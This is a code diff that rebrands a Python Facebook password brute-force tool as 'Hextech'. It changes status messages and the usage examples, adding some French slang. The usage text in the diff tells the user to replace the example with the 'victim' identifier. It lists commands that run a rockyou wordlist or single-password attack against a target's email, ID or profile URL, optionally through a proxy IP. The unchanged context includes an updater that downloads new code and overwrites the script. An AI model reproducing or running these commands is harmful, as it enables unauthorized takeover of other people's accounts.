@@ -142,16 +142,16 @@ class FaceBoom(object):
         if not os.path.isfile(versionPath):
             errMsg("Unable to check for updates: please re-clone the script to fix this problem")
             sys.exit(1)
-        write("[~] Checking for updates...\n")
+        write("[HEXTEC] Checking for updates...\n")
         conn = httplib.HTTPSConnection("raw.githubusercontent.com")
         conn.request("GET", "/Oseid/Facebook_hack/master/core/version.txt")
         repoVersion = conn.getresponse().read().strip().decode()
         with open(versionPath) as vf:
             currentVersion = vf.read().strip()
         if repoVersion == currentVersion:
-            write("  [*] The script is up to date!\n")
+            write("  [HEXTECH] The script is up to date!\n")
         else:
-            print("  [+] An update has been found ::: Updating... ")
+            print("  [HEXTECH RAPPORT] An update has been found ::: Updating... ")
             conn.request("GET", "/Oseid/FaceBook_hack/master/facebook_hack.py")
             newCode = conn.getresponse().read().strip().decode()
             with open("facebook_hack.py", "w") as facebook_hackScript:
@@ -184,13 +184,13 @@ Examples:
      |-------- COPIE UNE DE CES COMMANDE REMPLACE L'EXEMPLE PAR L'IDENTIFIANT DE LA VICTIME 
      | python facebook_hack.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
      |--------
-     | python facebook_hack.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
+     | python Hextech.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
      |--------
-     | python facebook_hack.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
+     | python Hextech.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
      |--------
-     | python facebook_hack.py -t Victim@gmail.com -s 1234567
+     | python Hextech.py -t VICTIM@email.com-s 1234567
      |--------
-     | python facebook_hack.py -g https://www.facebook.com/Victim_Profile
+     | python Hextech.py -g https://www.facebook.com/Victim_Profile
      |--------
 """ + wi)
 
@@ -218,7 +218,7 @@ def Main():
     opts = [target, wordlist, single_passwd, proxy, target_profile, update]
     if any(opt for opt in opts):
         if not faceboom.cnet():
-            errMsg("Please Check Your Internet Connection")
+            errMsg("stp bro mate un peu ta connexion...")
             sys.exit(1)
     if update:
         FaceBoom.updateFacebook_hack()
